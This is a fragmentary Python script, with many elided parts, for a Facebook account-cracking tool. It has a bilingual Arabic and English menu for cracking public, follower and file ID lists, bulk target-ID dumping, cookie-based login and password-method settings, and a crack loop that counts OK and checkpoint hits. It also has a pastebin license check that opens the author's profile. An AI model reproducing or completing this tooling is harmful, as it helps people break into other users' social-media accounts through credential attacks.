...
def subc():
   ...
   id="|".join(uuid)
   ses=requests.get("https://pastebin.com/XUBn5f7d").text
   if id in ses:
     pass
   else:
     print('''  
...
╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
     ...
     print(' ﻚﻠﻌﻔﻧ ﻪﺗﺯﻭ ﺩﻮﻜﻟﺍ ﺦﺴﻧﺍ') 
     time.sleep(0.5) 
     os.system("xdg-open https://www.facebook.com/profile.php?id=100000681246691&mibextid=2JQ9oc")
     sys.exit()
subc()
    ...
    def login_cokie(self):
        ...
        try:
            ...
            if 'href="/zero/optin/write/' in str(link):
                ...
                print("[✘] Inv𝐌𝐀𝐑𝐖𝐀𝐍 cookie [NO]");time.sleep(2);self.login_cokie()
...
def menu(my_name,my_id):
	...
	print(f'>> Your IP  : {ip}')
	print('')
	print('>> 1. Crack Publik :ﺀﺎﻗﺪﺻﻻﺍ ﻦﻣ    ✔️')
	print('>> 2. Crack Follower :ﻦﻴﻌﺑﺎﺘﻤﻟﺍ ﻦﻣ  ✔️')
	print('>> 3. Crack File :ﻒﻠﻣ ﻦﻣ         ✔️')
	print('>> 4. Crack Grup : ﺕﺎﺑﻭﺮﻛ ﻦﻣ      ✖')		
	print('>> 0. login out :ﺝﻭﺮﺧ ﻞﻴﺠﺴﺗ      ✔️   ')
...
def follower():
	try:
		...
		exit()
	try:
		jum = int(input('[>>] CRACK ID LIMIT : ﺕﺎﻳﺪﻳﻻﺍ ﺩﺪﻋ ﺐﺘﻛﺍ '))
	except ValueError:
		print('{k}[✖] NOT PUBLIC ID ')
		time.sleep(3)
		follower()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> Target Id ? ﻪﻓﺪﻬﺘﺴﻤﻟﺍ ﺕﺎﻳﺪﻳﻻﺍ ﺩﺪﻋ: '))
	except ValueError:
	...
	try:
		print('')
		print(f'>> ID :ﺕﺎﻳﺪﻳﻻﺍ ﺩﺪﻋ {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Loh Kurang Bagus ')
...
def setting():
	print(f'{x}>> 1. Id old :ﻪﻤﻳﺪﻗ ﺕﺎﻳﺪﻳﺍ ﻑﺍﺪﻬﺘﺳ  ')
	print('>> 2. Id New :ﻩﺪﻳﺪﺟ ﺕﺎﻳﺪﻳﺍ ﻑﺍﺪﻬﺘﺳﺍ  ')
	print('')
	hu = input('>> Chose : ')
	if hu in ['1','01']:
...
#		method.append('touch')
		...
		method.append('mobile')
	print('')
	_jembot_ = input('>> Add App : ﻪﻄﺒﺗﺮﻤﻟﺍ ﺕﺎﻘﻴﺒﻄﺘﻟﺍ ﺭﺎﻬﻇﺍ ( Y/t ) ')
	if _jembot_ in ['']:
		...
		taplikasi.append('no')
	pwplus=input('>> Password Manual :( Y ﻱﻭﺪﻳ ﺩﺭﻮﺳﺎﺑ) (Tﻲﺋﺍﻮﺸﻋ ) ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s{ [𝐌𝐀𝐑𝐖𝐀𝐍] %s/%s ➙ [OK] %s ➙ [CP] %s .. } %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
